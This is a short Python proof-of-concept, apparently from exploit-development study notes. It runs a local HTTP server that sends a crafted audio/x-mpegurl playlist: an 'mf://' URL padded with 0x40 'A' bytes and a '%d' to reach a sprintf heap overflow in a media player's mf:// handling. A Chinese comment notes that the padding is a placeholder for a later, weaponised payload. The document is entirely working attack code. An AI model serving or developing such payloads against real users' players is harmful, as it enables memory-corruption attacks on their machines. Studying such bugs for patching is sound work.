#!/usr/bin/env python3

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('localhost', 7000))
s.listen(5)
c, a = s.accept()
playlist  = b'mf://'
playlist += b'A'*0x40
playlist += b'%d' # we need a '%' to reach vulnerable path
"""
mf://AAA...AA%d
sprintf(fname, "AAA...AA%d", count++); 
char* fname = talloc_size(mf, strlen(filename) + 32);

我知道这里为什么用 0x40 个 A 了
这是为了占位，下一个 poc 就会将这些A替换成有意义的值，然后多的A继续填前面而保证偏移不变。

"""
d  = b'HTTP/1.1 200 OK\r\n'
d += b'Content-type: audio/x-mpegurl\r\n'
d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
d += b'\r\n'
d += playlist
c.send(d)
c.close()